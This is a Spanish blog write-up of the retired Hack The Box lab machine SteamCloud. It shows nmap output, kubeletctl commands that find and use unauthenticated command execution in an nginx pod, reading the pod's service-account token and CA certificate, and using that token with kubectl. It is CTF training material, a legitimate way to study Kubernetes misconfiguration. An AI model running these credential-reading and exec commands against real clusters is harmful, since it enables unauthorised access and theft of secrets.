<!DOCTYPE html>
<html lang="es"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
<title>Maquina Retirada SteamCloud de Hack The Box (Necesario VIP) | Blog de Hacking</title>
<meta name="generator" content="Jekyll v3.9.3" />
<meta property="og:title" content="Maquina Retirada SteamCloud de Hack The Box (Necesario VIP)" />
<meta name="author" content="K0Hack" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada STEAMCLOUD." />
<meta property="og:description" content="En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada STEAMCLOUD." />
<link rel="canonical" href="http://localhost:4000/2022/04/06/SteamCloud.html" />
<meta property="og:url" content="http://localhost:4000/2022/04/06/SteamCloud.html" />
<meta property="og:site_name" content="Blog de Hacking" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2022-04-06T00:00:00-03:00" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Maquina Retirada SteamCloud de Hack The Box (Necesario VIP)" />
<script type="application/ld+json">
{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"K0Hack"},"dateModified":"2022-04-06T00:00:00-03:00","datePublished":"2022-04-06T00:00:00-03:00","description":"En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada STEAMCLOUD.","headline":"Maquina Retirada SteamCloud de Hack The Box (Necesario VIP)","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2022/04/06/SteamCloud.html"},"url":"http://localhost:4000/2022/04/06/SteamCloud.html"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/style.css">
  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Blog de Hacking" /></head>
<body><div class="site-header">
  <div class="wrapper">
    <a class="site-title" rel="author" href="/">Blog de Hacking<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
    <span class="social_links">
        <a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a><a class="color--hover" href=""><i class="fab fa-"></i></a>
    </span>
  </div>
</div>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        
  <div class="author-box">
    
    
        <img src="" class="author-avatar" alt="Avatar" />
    
Blog Personal de K0Hack sobre Conceptos Hacking Etico // HTB // TryHackMe // Resumenes de Hacking // Herramientas para distintas tareas.

</div>


<div class="post">
  <h1 class="post-title">Maquina Retirada SteamCloud de Hack The Box (Necesario VIP)</h1>
  
  <div class="post-tags">
     
      <a class="tag" href="/tag/HTB,/">HTB,</a>
      
      <a class="tag" href="/tag/Kubernetes,/">Kubernetes,</a>
      
      <a class="tag" href="/tag/RCE,/">RCE,</a>
      
      <a class="tag" href="/tag/Misconfigurations,/">Misconfigurations,</a>
      
      <a class="tag" href="/tag/Malicius/">Malicius</a>
      
      <a class="tag" href="/tag/Pods/Container./">Pods/Container.</a>
      
  </div>
  
  <div class="post-date">Published on 06 Apr 2022</div>
  
  <noscript>
    <div class="post-description">En esta ocasion empezaremos con el Writeup de la maquina de HackTheBox llamada STEAMCLOUD.</div>
  </noscript>
  <div id="animated-post-description" class="post-description" style="display: none;"></div>
  
  <h1 id="steamcloud--hack-the-box-">SteamCloud ~ Hack The Box ~</h1>

<p>Realizamos el Primer escaneo con Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="s2">$" nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allports 10.10.11.133       "</span>
</code></pre></div></div>
<p>Procedemos con el siguiente escaneo de Nmap</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>PORT      STATE SERVICE          VERSION
22/tcp    open  ssh              OpenSSH 7.9p1 Debian 10+deb10u2 <span class="o">(</span>protocol 2.0<span class="o">)</span>
| ssh-hostkey: 
|   2048 <span class="nb">fc</span>:fb:90:ee:7c:73:a1:d4:bf:87:f8:71:e8:44:c6:3c <span class="o">(</span>RSA<span class="o">)</span>
|   256 46:83:2b:1b:01:db:71:64:6a:3e:27:cb:53:6f:81:a1 <span class="o">(</span>ECDSA<span class="o">)</span>
|_  256 1d:8d:d3:41:f3:ff:a4:37:e8:ac:78:08:89:c2:e3:c5 <span class="o">(</span>ED25519<span class="o">)</span>
2379/tcp  open  ssl/etcd-client?
|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
| tls-alpn: 
|_  h2
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-02-14T22:41:11
|_Not valid after:  2023-02-14T22:41:11
2380/tcp  open  ssl/etcd-server?
| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>steamcloud
| Subject Alternative Name: DNS:localhost, DNS:steamcloud, IP Address:10.10.11.133, IP Address:127.0.0.1, IP Address:0:0:0:0:0:0:0:1
| Not valid before: 2022-02-14T22:41:11
|_Not valid after:  2023-02-14T22:41:12
| tls-alpn: 
|_  h2
|_ssl-date: TLS randomness does not represent <span class="nb">time
</span>8443/tcp  open  ssl/https-alt
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: d26a87e5-e803-43c5-bb05-83491b15c124
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:37 GMT
|     Content-Length: 212
|     <span class="o">{</span><span class="s2">"kind"</span>:<span class="s2">"Status"</span>,<span class="s2">"apiVersion"</span>:<span class="s2">"v1"</span>,<span class="s2">"metadata"</span>:<span class="o">{}</span>,<span class="s2">"status"</span>:<span class="s2">"Failure"</span>,<span class="s2">"message"</span>:<span class="s2">"forbidden: User "</span>system:anonymous<span class="s2">" cannot get path "</span>/nice ports,/Trinity.txt.bak<span class="s2">""</span>,<span class="s2">"reason"</span>:<span class="s2">"Forbidden"</span>,<span class="s2">"details"</span>:<span class="o">{}</span>,<span class="s2">"code"</span>:403<span class="o">}</span>
|   GetRequest: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: a0619f00-d9d1-427a-8826-86ea39143092
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:36 GMT
|     Content-Length: 185
|     <span class="o">{</span><span class="s2">"kind"</span>:<span class="s2">"Status"</span>,<span class="s2">"apiVersion"</span>:<span class="s2">"v1"</span>,<span class="s2">"metadata"</span>:<span class="o">{}</span>,<span class="s2">"status"</span>:<span class="s2">"Failure"</span>,<span class="s2">"message"</span>:<span class="s2">"forbidden: User "</span>system:anonymous<span class="s2">" cannot get path "</span>/<span class="s2">""</span>,<span class="s2">"reason"</span>:<span class="s2">"Forbidden"</span>,<span class="s2">"details"</span>:<span class="o">{}</span>,<span class="s2">"code"</span>:403<span class="o">}</span>
|   HTTPOptions: 
|     HTTP/1.0 403 Forbidden
|     Audit-Id: f7a4fd6b-8166-42e5-9cad-dd2acc308247
|     Cache-Control: no-cache, private
|     Content-Type: application/json
|     X-Content-Type-Options: nosniff
|     X-Kubernetes-Pf-Flowschema-Uid: 608dea06-2a35-4053-a494-fc3e243fb1d6
|     X-Kubernetes-Pf-Prioritylevel-Uid: 3faf9dc0-ffc4-4c00-a461-1cf53b47030e
|     Date: Tue, 15 Feb 2022 18:39:37 GMT
|     Content-Length: 189
|_    <span class="o">{</span><span class="s2">"kind"</span>:<span class="s2">"Status"</span>,<span class="s2">"apiVersion"</span>:<span class="s2">"v1"</span>,<span class="s2">"metadata"</span>:<span class="o">{}</span>,<span class="s2">"status"</span>:<span class="s2">"Failure"</span>,<span class="s2">"message"</span>:<span class="s2">"forbidden: User "</span>system:anonymous<span class="s2">" cannot options path "</span>/<span class="s2">""</span>,<span class="s2">"reason"</span>:<span class="s2">"Forbidden"</span>,<span class="s2">"details"</span>:<span class="o">{}</span>,<span class="s2">"code"</span>:403<span class="o">}</span>
|_http-title: Site doesn<span class="s1">'t have a title (application/json).
| tls-alpn: 
|   h2
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=minikube/organizationName=system:masters
| Subject Alternative Name: DNS:minikubeCA, DNS:control-plane.minikube.internal, DNS:kubernetes.default.svc.cluster.local, DNS:kubernetes.default.svc, DNS:kubernetes.default, DNS:kubernetes, DNS:localhost, IP Address:10.10.11.133, IP Address:10.96.0.1, IP Address:127.0.0.1, IP Address:10.0.0.1
| Not valid before: 2022-02-13T22:41:08
|_Not valid after:  2025-02-13T22:41:08
10249/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
10250/tcp open  ssl/http         Golang net/http server <span class="o">(</span>Go-IPFS json-rpc or InfluxDB API<span class="o">)</span>
|_http-title: Site doesn<span class="s1">'t have a title (text/plain; charset=utf-8).
| tls-alpn: 
|   h2
|_  http/1.1
| ssl-cert: Subject: commonName=steamcloud@1644878477
| Subject Alternative Name: DNS:steamcloud
| Not valid before: 2022-02-14T21:41:16
|_Not valid after:  2023-02-14T21:41:16
|_ssl-date: TLS randomness does not represent time
10256/tcp open  http             Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Site doesn'</span>t have a title <span class="o">(</span>text/plain<span class="p">;</span> <span class="nv">charset</span><span class="o">=</span>utf-8<span class="o">)</span><span class="nb">.</span>
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8443-TCP:V<span class="o">=</span>7.92%T<span class="o">=</span>SSL%I<span class="o">=</span>7%D<span class="o">=</span>2/15%Time<span class="o">=</span>620BEF4B%P<span class="o">=</span>x86_64-pc-linux-gn
SF:u%r<span class="o">(</span>GetRequest,22F,<span class="s2">"HTTP/1</span><span class="se">\.</span><span class="s2">0</span><span class="se">\x</span><span class="s2">20403</span><span class="se">\x</span><span class="s2">20Forbidden</span><span class="se">\r\n</span><span class="s2">Audit-Id:</span><span class="se">\x</span><span class="s2">20a0619
SF:f00-d9d1-427a-8826-86ea39143092</span><span class="se">\r\n</span><span class="s2">Cache-Control:</span><span class="se">\x</span><span class="s2">20no-cache,</span><span class="se">\x</span><span class="s2">20priva
SF:te</span><span class="se">\r\n</span><span class="s2">Content-Type:</span><span class="se">\x</span><span class="s2">20application/json</span><span class="se">\r\n</span><span class="s2">X-Content-Type-Options:</span><span class="se">\x</span><span class="s2">20n
SF:osniff</span><span class="se">\r\n</span><span class="s2">X-Kubernetes-Pf-Flowschema-Uid:</span><span class="se">\x</span><span class="s2">20608dea06-2a35-4053-a494-fc
SF:3e243fb1d6</span><span class="se">\r\n</span><span class="s2">X-Kubernetes-Pf-Prioritylevel-Uid:</span><span class="se">\x</span><span class="s2">203faf9dc0-ffc4-4c00-
SF:a461-1cf53b47030e</span><span class="se">\r\n</span><span class="s2">Date:</span><span class="se">\x</span><span class="s2">20Tue,</span><span class="se">\x</span><span class="s2">2015</span><span class="se">\x</span><span class="s2">20Feb</span><span class="se">\x</span><span class="s2">202022</span><span class="se">\x</span><span class="s2">2018:39:36</span><span class="se">\x</span><span class="s2">20
SF:GMT</span><span class="se">\r\n</span><span class="s2">Content-Length:</span><span class="se">\x</span><span class="s2">20185</span><span class="se">\r\n\r\n</span><span class="s2">{</span><span class="se">\"</span><span class="s2">kind</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Status</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">apiVersion</span><span class="se">\</span><span class="s2">
SF:"</span>:<span class="se">\"</span>v1<span class="se">\"</span>,<span class="se">\"</span>metadata<span class="se">\"</span>:<span class="o">{}</span>,<span class="se">\"</span>status<span class="se">\"</span>:<span class="se">\"</span>Failure<span class="se">\"</span>,<span class="se">\"</span>message<span class="se">\"</span>:<span class="se">\"</span>forbidden
SF::<span class="se">\x</span>20User<span class="se">\x</span>20<span class="se">\\\"</span>system:anonymous<span class="se">\\\"\x</span>20cannot<span class="se">\x</span>20get<span class="se">\x</span>20path<span class="se">\x</span>20<span class="se">\\\"</span>/
SF:<span class="se">\\\"\"</span>,<span class="se">\"</span>reason<span class="se">\"</span>:<span class="se">\"</span>Forbidden<span class="se">\"</span>,<span class="se">\"</span>details<span class="se">\"</span>:<span class="o">{}</span>,<span class="se">\"</span>code<span class="se">\"</span>:403<span class="o">}</span><span class="se">\n</span><span class="s2">")%r(HTTP
SF:Options,233,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20403<span class="se">\x</span>20Forbidden<span class="se">\r\n</span>Audit-Id:<span class="se">\x</span>20f7a4fd6b-816
SF:6-42e5-9cad-dd2acc308247<span class="se">\r\n</span>Cache-Control:<span class="se">\x</span>20no-cache,<span class="se">\x</span>20private<span class="se">\r\n</span>C
SF:ontent-Type:<span class="se">\x</span>20application/json<span class="se">\r\n</span>X-Content-Type-Options:<span class="se">\x</span>20nosniff<span class="se">\</span>
SF:r<span class="se">\n</span>X-Kubernetes-Pf-Flowschema-Uid:<span class="se">\x</span>20608dea06-2a35-4053-a494-fc3e243fb
SF:1d6<span class="se">\r\n</span>X-Kubernetes-Pf-Prioritylevel-Uid:<span class="se">\x</span>203faf9dc0-ffc4-4c00-a461-1c
SF:f53b47030e<span class="se">\r\n</span>Date:<span class="se">\x</span>20Tue,<span class="se">\x</span>2015<span class="se">\x</span>20Feb<span class="se">\x</span>202022<span class="se">\x</span>2018:39:37<span class="se">\x</span>20GMT<span class="se">\r\n</span>
SF:Content-Length:<span class="se">\x</span>20189<span class="se">\r\n\r\n</span><span class="o">{</span><span class="se">\"</span>kind<span class="se">\"</span>:<span class="se">\"</span>Status<span class="se">\"</span>,<span class="se">\"</span>apiVersion<span class="se">\"</span>:<span class="se">\"</span>v1<span class="se">\</span>
SF:<span class="s2">",</span><span class="se">\"</span><span class="s2">metadata</span><span class="se">\"</span><span class="s2">:{},</span><span class="se">\"</span><span class="s2">status</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">Failure</span><span class="se">\"</span><span class="s2">,</span><span class="se">\"</span><span class="s2">message</span><span class="se">\"</span><span class="s2">:</span><span class="se">\"</span><span class="s2">forbidden:</span><span class="se">\x</span><span class="s2">20Us
SF:er</span><span class="se">\x</span><span class="s2">20</span><span class="se">\\\"</span><span class="s2">system:anonymous</span><span class="se">\\\"\x</span><span class="s2">20cannot</span><span class="se">\x</span><span class="s2">20options</span><span class="se">\x</span><span class="s2">20path</span><span class="se">\x</span><span class="s2">20</span><span class="se">\\\"</span><span class="s2">/</span><span class="se">\\\</span><span class="s2">
SF:"</span><span class="se">\"</span>,<span class="se">\"</span>reason<span class="se">\"</span>:<span class="se">\"</span>Forbidden<span class="se">\"</span>,<span class="se">\"</span>details<span class="se">\"</span>:<span class="o">{}</span>,<span class="se">\"</span>code<span class="se">\"</span>:403<span class="o">}</span><span class="se">\n</span><span class="s2">")%r(FourOhF
SF:ourRequest,24A,"</span>HTTP/1<span class="se">\.</span>0<span class="se">\x</span>20403<span class="se">\x</span>20Forbidden<span class="se">\r\n</span>Audit-Id:<span class="se">\x</span>20d26a87e5-
SF:e803-43c5-bb05-83491b15c124<span class="se">\r\n</span>Cache-Control:<span class="se">\x</span>20no-cache,<span class="se">\x</span>20private<span class="se">\r</span>
SF:<span class="se">\n</span>Content-Type:<span class="se">\x</span>20application/json<span class="se">\r\n</span>X-Content-Type-Options:<span class="se">\x</span>20nosni
SF:ff<span class="se">\r\n</span>X-Kubernetes-Pf-Flowschema-Uid:<span class="se">\x</span>20608dea06-2a35-4053-a494-fc3e24
SF:3fb1d6<span class="se">\r\n</span>X-Kubernetes-Pf-Prioritylevel-Uid:<span class="se">\x</span>203faf9dc0-ffc4-4c00-a461
SF:-1cf53b47030e<span class="se">\r\n</span>Date:<span class="se">\x</span>20Tue,<span class="se">\x</span>2015<span class="se">\x</span>20Feb<span class="se">\x</span>202022<span class="se">\x</span>2018:39:37<span class="se">\x</span>20GMT<span class="se">\</span>
SF:r<span class="se">\n</span>Content-Length:<span class="se">\x</span>20212<span class="se">\r\n\r\n</span><span class="o">{</span><span class="se">\"</span>kind<span class="se">\"</span>:<span class="se">\"</span>Status<span class="se">\"</span>,<span class="se">\"</span>apiVersion<span class="se">\"</span>:<span class="se">\"</span>
SF:v1<span class="se">\"</span>,<span class="se">\"</span>metadata<span class="se">\"</span>:<span class="o">{}</span>,<span class="se">\"</span>status<span class="se">\"</span>:<span class="se">\"</span>Failure<span class="se">\"</span>,<span class="se">\"</span>message<span class="se">\"</span>:<span class="se">\"</span>forbidden:<span class="se">\x</span>2
SF:0User<span class="se">\x</span>20<span class="se">\\\"</span>system:anonymous<span class="se">\\\"\x</span>20cannot<span class="se">\x</span>20get<span class="se">\x</span>20path<span class="se">\x</span>20<span class="se">\\\"</span>/nice
SF:<span class="se">\x</span>20ports,/Trinity<span class="se">\.</span>txt<span class="se">\.</span>bak<span class="se">\\\"\"</span>,<span class="se">\"</span>reason<span class="se">\"</span>:<span class="se">\"</span>Forbidden<span class="se">\"</span>,<span class="se">\"</span>details<span class="se">\"</span>
SF::<span class="o">{}</span>,<span class="se">\"</span>code<span class="se">\"</span>:403<span class="o">}</span><span class="se">\n</span><span class="s2">");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Feb 15 19:23:39 2022 -- 1 IP address (1 host up) scanned in 108.88 seconds
</span></code></pre></div></div>

<p>Vemos por los puertos abiertos que estamos ante Kubernetes
Procedemos a usar dos herramientas para ello</p>

<h1 id="kubectl--kubeletctl">Kubectl &amp; Kubeletctl</h1>

<p>Procedemos a listar los “Pods” existentes con Kubeletctl</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kubeletctl -s 10.10.11.133 pods                                                                                        1 ⚙</span>
┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods from Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 1 │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 2 │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 3 │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 4 │ etcd-steamcloud                    │ kube-system │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 5 │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 6 │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 7 │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ 8 │ storage-provisioner                │ kube-system │ storage-provisioner     │
│   │                                    │             │                         │
└───┴────────────────────────────────────┴─────────────┴─────────────────────────┘
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Para listar si tenemos ejecucion remota de comandos en algun pod/ container </span>
<span class="c"># kubeletctl -s 10.10.11.133 scan rce                             130 ⨯ 1 ⚙</span>
┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   Node with pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ NODE IP      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 1 │ 10.10.11.133 │ storage-provisioner                │ kube-system │ storage-provisioner     │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 2 │              │ kube-proxy-zd55k                   │ kube-system │ kube-proxy              │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 3 │              │ coredns-78fcd69978-gl6gt           │ kube-system │ coredns                 │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 4 │              │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 5 │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 6 │              │ kube-apiserver-steamcloud          │ kube-system │ kube-apiserver          │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 7 │              │ kube-controller-manager-steamcloud │ kube-system │ kube-controller-manager │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ 8 │              │ kube-scheduler-steamcloud          │ kube-system │ kube-scheduler          │ -   │
└───┴──────────────┴────────────────────────────────────┴─────────────┴─────────────────────────┴─────┘
</code></pre></div></div>
<p>Accediendo al contenedor</p>
<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># rlwrap kubeletctl -s 10.10.11.133 -p nginx -c nginx exec bash </span>
root@nginx:/# <span class="nb">cat</span> /root/user.txt
3x7bxxxx245fc708b1xxxxxxxxxxxxxx
</code></pre></div></div>

<h1 id="escalada-de-privilegios">Escalada de Privilegios</h1>
<p>KUBERNETES TOKENS → cuando tenemos RCE en algun Pod 
https://book.hacktricks.xyz/cloud-security/pentesting-kubernetes/kubernetes-enumeration</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "ls -l /run/secrets/kubernetes.io/serviceaccount"                             </span>
total 0
lrwxrwxrwx 1 root root 13 Apr  4 12:31 ca.crt -&gt; ..data/ca.crt
lrwxrwxrwx 1 root root 16 Apr  4 12:31 namespace -&gt; ..data/namespace
lrwxrwxrwx 1 root root 12 Apr  4 12:31 token -&gt; ..data/token

<span class="c"># kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/ca.crt" &gt; content/ca.crt</span>
<span class="c"># kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/namespace" &gt; content/namespace</span>
<span class="c"># kubeletctl -s 10.10.11.133 -p nginx -c nginx exec "cat /run/secrets/kubernetes.io/serviceaccount/token" &gt; content/token</span>
</code></pre></div></div>
<p>Procedemos a intentar authenticarnos con estos tres recursos de la siguiente forma usando Kubectl</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Conectandonos con Kubectl siguiendo los pasos proporcionando ca.crt y token</span>

<span class="c"># kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' get pods</span>
NAME    READY   STATUS    RESTARTS   AGE
nginx   1/1     Running   0          28m
</code></pre></div></div>
<p>Vemos que funciona y aqui procedemos a intentar insertar el parametro “auth”</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># kubectl -s https://10.10.11.133:8443 --certificate-authority=content/ca.crt --token='eyJhbGciOiJSUzI1NiIsImtpZCI6IlJ5N3BJcURINldzSUt1SFFiU0xjRUtDbi1GQXY0R1lwRlRyX3ByRFZ3RGcifQ.eyJhdWQiOlsiaHR0cHM6Ly9rdWJlcm5ldGVzLmRlZmF1bHQuc3ZjLmNsdXN0ZXIubG9jYWwiXSwiZXhwIjoxNjgwNjExNDYyLCJpYXQiOjE2NDkwNzU0NjIsImlzcyI6Imh0dHBzOi8va3ViZXJuZXRlcy5kZWZhdWx0LnN2Yy5jbHVzdGVyLmxvY2FsIiwia3ViZXJuZXRlcy5pbyI6eyJuYW1lc3BhY2UiOiJkZWZhdWx0IiwicG9kIjp7Im5hbWUiOiJuZ2lueCIsInVpZCI6ImVmMWNlMzYzLTU0YzktNDQwNC1hODcwLTMzMWRmMDk2NmI0ZiJ9LCJzZXJ2aWNlYWNjb3VudCI6eyJuYW1lIjoiZGVmYXVsdCIsInVpZCI6IjMwNzc2NjdmLTVmZGUtNDhlYi1iMmM1LWQ5NmVhM2UyODgxNSJ9LCJ3YXJuYWZ0ZXIiOjE2NDkwNzkwNjl9LCJuYmYiOjE2NDkwNzU0NjIsInN1YiI6InN5c3RlbTpzZXJ2aWNlYWNjb3VudDpkZWZhdWx0OmRlZmF1bHQifQ.TZCj8E75Ludl2FQOP_VOy1lPxHG4JZfcfKv71CgK0faFXHMwN2rve1pqXbAT3LfYtEWC9ZiVJc36ZwXdZ-yO5NjgDkapKQKvfhilTbaR3BnkzL2rArZVuiEbdBn2QIzUJGtuAOmz3jWk_fS64JkHWQiAIO_vMoZsBZeXZtszgz8h_cR3Un7__H4HDJRf5djlgbQx83dN5xCVyLHdv0oXNLkpakhbT49KkD6nd7_h-G258itL6Qweg-ketm-UpjuKMTQ_fYdozuVf0Qvub7so5gDb3puajgKN9LMxIPzPt4YdcYXMzAfkmQtztn7y9K-_teOyOPRZyizXLB-o2X2WYw' auth    </span>
Inspect authorization

Available Commands:
  can-i       Check whether an action is allowed
  reconcile   Reconciles rules <span class="k">for </span>RBAC role, role binding, cluster role, and cluster role binding objects
</code></pre></div></div>

